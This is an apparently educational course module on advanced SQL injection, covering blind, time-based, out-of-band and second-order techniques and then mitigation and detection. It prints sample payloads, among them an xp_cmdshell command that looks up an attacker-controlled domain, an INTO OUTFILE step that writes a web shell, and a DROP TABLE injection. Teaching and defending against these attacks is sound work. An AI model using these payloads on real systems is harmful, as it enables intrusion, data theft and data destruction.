# Advanced SQL Injection

## What you will learn in this course 🧐🧐

- Understand the concept of Advanced SQL Injection
- Learn how to exploit Advanced SQL Injection vulnerabilities

Advanced SQL Injection vulnerabilities occur when attackers exploit SQL queries to manipulate database queries, bypass authentication, retrieve sensitive data, or execute arbitrary commands.

### Exploitation

A typical SQL injection attack occurs when an attacker manipulates a web application’s SQL queries by injecting malicious input into vulnerable input fields. For example, if a login form directly inserts user input into an SQL query without proper validation, an attacker can enter input like `' OR '1'='1` to alter the query logic. This injection changes the query to always return true, potentially bypassing authentication and granting unauthorized access. The attacker can then exploit this access to retrieve, modify, or delete sensitive data from the database. Proper validation, parameterized queries, and secure coding practices are essential to prevent such vulnerabilities. Here is how a typical SQL Injection happen:

1. The attacker injects malicious SQL code into vulnerable input fields.
2. This modifies SQL queries to retrieve sensitive data or perform unauthorized actions.
3. The attacker gains access to database contents or performs administrative actions.

![SQL_Injection](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D05-Web_Pentesting_02/01-lectures/sql-injection.png)

Advanced SQL injection techniques go beyond simple query manipulations, leveraging complex strategies to access data, bypass security controls, or execute arbitrary commands. In the following sections, we will explore these advanced techniques, including blind SQL injection, out-of-band injections, and second-order SQL injections, each presenting unique challenges and requiring specific mitigation approaches to effectively safeguard against such threats.

#### Blind SQL Injection

Blind SQL Injection occurs when the attacker cannot directly see the data but can infer information from the application's behavior based on the true/false condition of injected SQL statements.

**Types of Blind SQL Injection:**

- **Boolean-Based Blind SQL Injection:** The attacker injects SQL queries that cause the application to respond with true or false conditions. Based on these responses, such as changes in the page content or error messages, the attacker can deduce database information.

**Example of Vulnerable Code:**

```php
// Vulnerable query
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Injection Example:**

```sql
' OR '1'='1' --
```

If the page loads as expected, it indicates the condition `1=1` is true, revealing potential vulnerabilities.

- **Time-Based Blind SQL Injection:** This technique involves causing delays in the database response to infer data. By injecting SQL statements that introduce delays (e.g., using `SLEEP()`), the attacker measures the response time to infer information.

**Example of Vulnerable Code:**

```php
// Vulnerable query
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Injection Example:**

```sql
' AND SLEEP(5) --
```

If the application response is delayed by 5 seconds, it indicates that the injected condition is true.

#### Out-of-Band (OOB) SQL Injection

Out-of-Band SQL Injection uses database functionalities to perform network requests to an attacker-controlled server. This bypasses the application’s output channel by directly exploiting the database's ability to interact with external resources.

**Techniques:**

- **DNS Exfiltration:** The attacker injects SQL queries that trigger DNS lookups to domains controlled by the attacker. The presence or absence of these DNS requests can convey data.

**Example of Vulnerable Code:**

```php
// Vulnerable query using xp_cmdshell for exfiltration
$query = "SELECT * FROM users WHERE username = '$username'";
```

**Injection Example:**

```sql
'; EXEC xp_cmdshell 'nslookup example.com' --
```

This forces the SQL server to perform a DNS lookup to a domain controlled by the attacker.

- **HTTP Requests:** Injected SQL queries can initiate HTTP requests to an external server controlled by the attacker.

**Example of Vulnerable Code:**

```php
// Vulnerable query that writes a file
$query = "SELECT * FROM users WHERE username = '$username'";
```

**Injection Example:**

```sql
'; SELECT ... INTO OUTFILE '/var/www/html/shell.php' FROM ... --
```

This query writes a PHP file containing malicious code, which, when executed, sends data to an attacker’s server.

#### Second-Order SQL Injection

Second-Order SQL Injection occurs when user input is stored in the database and later used in SQL queries, possibly by another user or session. This stored data may include malicious SQL commands that are executed later.

**Example Scenario:**

A web application allows users to submit reviews stored in a database. If another user views these reviews, the malicious content can trigger an SQL injection when processed.

**Example of Vulnerable Code:**

```php
// Vulnerable query using stored data
$query = "SELECT * FROM reviews WHERE review_content = '$reviewContent'";
```

**Injection Example:**

```sql
'); DROP TABLE users; --
```

When the review is displayed or processed, it could lead to the execution of SQL commands like dropping a table.

#### Time-Based SQL Injection

Time-Based SQL Injection exploits the time taken by the database to process queries. This technique is effective when other types of injections are mitigated or when data needs to be extracted without visible responses.

**Techniques:**

- **Delays in Queries:** Attackers inject SQL queries that cause intentional delays. By measuring the response time, attackers can infer the truth or falsehood of conditions, revealing database structure or content.

**Example of Vulnerable Code:**

```php
// Vulnerable query with time delay
$query = "SELECT * FROM users WHERE username = '$username'";
```

**Injection Example:**

```sql
IF (SELECT SUBSTRING(database(),1,1)='d') SLEEP(5) ELSE 0 --
```

If the application response is delayed by 5 seconds, it indicates that the first character of the database name is 'd'.

## Mitigation Techniques

To effectively mitigate Advanced SQL Injection vulnerabilities, adopting best practices in coding and database management is crucial. One of the primary methods is to use parameterized queries or prepared statements. For example, in PHP, you can use the `PDO` extension to create a parameterized query:

```php
// Using PDO to prevent SQL Injection
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
$results = $stmt->fetchAll();
```

In this approach, the `:username` and `:password` are placeholders that are safely bound to user input, preventing the execution of any injected SQL code.

Another essential measure is input validation and sanitization. Ensure all user inputs are checked and sanitized. For example, you can use PHP’s `filter_var` to validate email inputs:

```php
// Validating and sanitizing email input
$email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
    echo "Invalid email format";
}
```

This code snippet cleans and validates the email input, reducing the risk of SQL Injection through malformed data.

Limiting database permissions is also critical. For instance, if your application only needs read access, configure the database user accordingly:

```sql
-- Granting only SELECT privileges
GRANT SELECT ON my_database.* TO 'app_user'@'localhost';
```

By restricting database user permissions, you minimize the potential damage if an SQL Injection attack is successful.

Implementing a Web Application Firewall (WAF) can further protect against SQL Injection. A WAF filters incoming traffic and blocks harmful requests. For example, a WAF can be configured to detect and block common SQL Injection patterns, such as:

```sql
' OR '1'='1
```

## Detection Techniques

Detecting Advanced SQL Injection vulnerabilities involves a combination of proactive and reactive approaches. Code reviews are a fundamental part of this process. Reviewing code for unsafe SQL query construction can reveal vulnerabilities. For example, identify and fix unsafe code like:

```php
// Vulnerable code
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Automated vulnerability scanners can also be used to find SQL Injection vulnerabilities. Tools such as SQLMap can test web applications for SQL Injection weaknesses by simulating attacks.

Monitoring database activity is crucial for detecting potential SQL Injection attacks. For instance, abnormal database query patterns can be logged and reviewed. If a query takes an unusually long time to execute, it might indicate a Time-Based SQL Injection attack:

```sql
-- Potentially malicious query causing delay
' AND IF (1=1, SLEEP(5), 0) --
```

Deploying an Intrusion Detection System (IDS) can enhance detection. An IDS can monitor network traffic and database queries for suspicious activities. For example, if the IDS detects an unusual volume of DNS requests or HTTP requests, it can alert administrators:

```sql
-- Example of an OOB SQL Injection using DNS exfiltration
'; EXEC xp_cmdshell 'nslookup example.com' --
```

## Resources

- [OWASP Testing for SQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [Pentester Guide to SQL Injection](https://www.cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli)
